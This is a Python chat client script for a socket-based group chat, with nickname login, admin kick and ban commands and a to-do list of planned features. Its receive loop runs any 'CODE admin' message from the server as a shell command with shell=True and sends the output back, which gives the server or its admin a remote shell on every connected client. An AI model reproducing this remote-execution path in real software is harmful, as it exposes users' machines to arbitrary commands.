import threading
import socket
import sys
import subprocess

if len(sys.argv) != 3:
    print("Usage: python script.py [IP_ADDRESS] [PORT]")
    sys.exit(1)
    
password = ''
nickname = input("Choose a nickname: ")
if nickname == 'admin':
    password = input("Enter the password: ")

ip_address = sys.argv[1]
port = int(sys.argv[2])

client = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
client.connect((ip_address, port))

stop_thread = False

def receive(client, nickname, password):
    while True:
        global stop_thread
        if stop_thread:
            break
        try:
            message = client.recv(4096).decode('ascii')
            if message == 'nickname?':
                client.send(nickname.encode('ascii'))
                next_message = client.recv(1024).decode('ascii')
                if next_message == 'password?':
                    client.send(password.encode('ascii'))
                    if client.recv(1024).decode('ascii') == 'The password is incorrect!':
                        print("The password is incorrect!")
                        stop_thread = True
                elif next_message == 'you are banned by an admin!' or next_message == 'You are kicked by an admin!' or next_message == 'banned' or next_message =="An error occurred!":
                    client.close()
                    stop_thread = True
                    break
            elif message.split()[0] == 'CODE' and message.split()[1] == 'admin':
                recipient = message.split()[1]
                command = message.split(' ', 2)[2]
                try:
                    result = subprocess.check_output(command, shell=True)
                    #client.send(f'TO {recipient} {result}'.encode('ascii'))
                    for line in result.splitlines():
                        client.send(f'TO {recipient} {line}\n'.encode('ascii'))
                except:
                    pass
                    #client.send('An error occurred!'.encode('ascii'))
            else:
                print(message)

        except Exception as e:
            print("An error occurred! ",e)
            client.close()
            stop_thread = True
            break

def write(nickname, client):
    while True:
        if stop_thread:
            break
        message = f'{nickname}: {input("")}'
        if message[len(nickname)+2:] == '*help':
            print("\nCommands:\n\n*clear - Clears the screen\n*talk <nickname,...> - Starts a private chat\n*end - Ends the private chat\n*help - Shows the help menu\n*online - Shows the online people\n*exit - Exits the chat\n\nADMIN Commands: \n\n\n/kick <user> - Kicks a user\n/ban <user> - Bans a user\n/code <nickname> <message> - Executes a command on the server if no nickname given else on given nickname\n/exit - Exits the server")
        if message[len(nickname)+2:] == '*clear':
            subprocess.call('cls', shell=True)
        if message[len(nickname)+2:].startswith('*talk'):
            client.send(f'TALK {message[len(nickname)+2+5:]}'.encode('ascii'))
        if message[len(nickname)+2:].startswith('*online'):
            client.send(f'ONLINE'.encode('ascii'))
        if message[len(nickname)+2:] == 'exit':
            client.close()
            break
        if message[len(nickname)+2:].startswith('/'):
            if nickname == 'admin':
                if message[len(nickname)+2:].startswith('/kick'):
                    client.send(f'KICK {message[len(nickname)+2+6:]}'.encode('ascii'))
                elif message[len(nickname)+2:].startswith('/ban'):
                    client.send(f'BAN {message[len(nickname)+2+5:]}'.encode('ascii'))
                elif message[len(nickname)+2:].startswith('/code'):
                    client.send(f'CODE {message[len(nickname)+2+6:]}'.encode('ascii'))
                    print('sent this to the server: ',message[len(nickname)+2+6:])
                elif message[len(nickname)+2:].startswith('/exit'):
                    client.send('EXIT'.encode('ascii'))
                    client.close()
                    break
            else:
                print("Commands can only be executed by the admin!")
        else:
            client.send(message.encode('ascii'))

receive_thread = threading.Thread(target=receive, args=(client, nickname, password))
receive_thread.start()
write_thread = threading.Thread(target=write, args=(nickname, client))
write_thread.start()


#####TODO#####
##i want to add encryption to the chat and file upload and download and also add a feature to send a file to a specific user
## maybe a tic tac toe game 
## Show when another user is typing a message.
##  Let users edit or delete their own messages.
## Implement voice or video chat functionality.
## chatbot
## Give users the ability to mute/unmute other users or notifications.
## Allow users to share their screen during a conversation.